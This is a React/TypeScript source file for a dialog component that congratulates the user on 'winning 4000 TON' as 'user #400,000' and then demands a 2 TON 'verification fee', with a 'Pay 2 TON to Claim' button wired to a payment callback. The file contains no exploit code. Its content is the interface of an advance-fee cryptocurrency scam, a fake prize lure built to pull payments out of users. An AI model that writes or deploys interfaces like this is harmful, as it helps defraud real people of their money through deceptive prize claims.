
import React from 'react';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';

interface GiftDialogProps {
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onPaymentComplete: () => void;
  isProcessing: boolean;
}

const GiftDialog: React.FC<GiftDialogProps> = ({
  isOpen,
  onOpenChange,
  onPaymentComplete,
  isProcessing
}) => {
  return (
    <AlertDialog open={isOpen} onOpenChange={onOpenChange}>
      <AlertDialogContent className="max-w-xs bg-gradient-to-br from-gray-900 via-slate-800 to-black border border-gray-600 text-white">
        <AlertDialogHeader>
          <AlertDialogTitle className="text-base font-bold text-center bg-gradient-to-r from-yellow-400 via-orange-400 to-yellow-600 bg-clip-text text-transparent">
            Congratulations! You won 4000 TON
          </AlertDialogTitle>
          <AlertDialogDescription className="text-gray-300 text-center space-y-2">
            <p className="text-xs">You became user #400,000! To celebrate this achievement, you have been selected to receive 4000 TON.</p>
            
            <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-2">
              <p className="font-semibold text-yellow-400 text-xs">Important Notice:</p>
              <p className="text-xs">A verification fee of 2 TON is required to ensure the prize is delivered to the correct wallet.</p>
            </div>
          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter className="flex flex-col gap-2">
          <AlertDialogAction
            onClick={onPaymentComplete}
            disabled={isProcessing}
            className="w-full bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-700 hover:to-emerald-800 text-white font-bold py-2 text-xs"
          >
            {isProcessing ? 'Processing...' : 'Pay 2 TON to Claim'}
          </AlertDialogAction>
          <AlertDialogCancel className="w-full bg-gray-700 hover:bg-gray-600 text-white border-gray-600 text-xs">
            Cancel
          </AlertDialogCancel>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
};

export default GiftDialog;
